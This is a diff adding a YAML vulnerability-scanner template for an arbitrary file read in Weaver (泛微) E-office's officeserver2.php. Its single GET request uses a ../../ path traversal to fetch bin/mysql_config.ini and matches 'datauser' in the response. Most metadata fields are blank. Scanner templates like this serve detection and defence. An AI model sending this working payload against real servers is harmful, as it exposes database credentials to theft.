@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 泛微E-office OfficeServer2.php 存在任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+response1:
+  headers:
+  body: datauser
+  code:
+requests2:
+response2:
